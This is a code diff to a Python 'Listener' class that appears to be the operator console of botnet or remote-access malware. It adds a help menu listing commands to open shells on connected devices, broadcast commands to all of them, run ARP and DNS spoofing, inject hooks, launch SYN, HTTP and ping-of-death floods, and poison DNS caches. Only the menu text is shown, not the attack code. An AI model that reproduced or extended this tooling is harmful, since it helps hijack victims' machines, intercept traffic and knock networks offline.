@@ -101,6 +101,29 @@ class Listener:
                 self.listener.close()
                 break
 
+            elif command[0] == "help":
+                print("------------------------------------------------------------------------------------")
+                print("COMMANDS                                 DESCRIPTION")
+                print("------------------------------------------------------------------------------------")
+                print("help                                     Show commands")
+                print("exit                                     Exit the Center")
+                print("connections                              Show connected devices")
+                print("session <number>                         Open terminal of specific device")
+                print("sendall <command>                        Broadcast command to all connected devices")
+                print("--arpspoof                               Auto scan & arp spoof")
+                print("--dnsspoof <target-url> <spoofed-ip>     DNS spoof attack")
+                print("--hook                                   Hook injector")
+                print("--synflood <target-ip> <ports> <times>   SYN flood attack")
+                print("--httpflood <target-ip> <times>          HTTP flood attack")
+                print("--pod <target-ip> <times>                Ping of death attack")
+                print("--dnscachepoison <target-url>\n"
+                      "  <nameserver> <auth-ip> <rec-ip>\n"
+                      "  <spoof-url> <ports>                    DNS cache poisoning")
+                print("--killarp                                Kill process running arp spoof")
+                print("--killdns                                Kill process running dns spoof")
+                print("--killhook                               Kill process running hook injector")
+                print("------------------------------------------------------------------------------------")
+
             elif command[0] == "connections":
                 for i, address in enumerate(self.addresses):
                     print("{}. {}".format(str(i), str(address)))
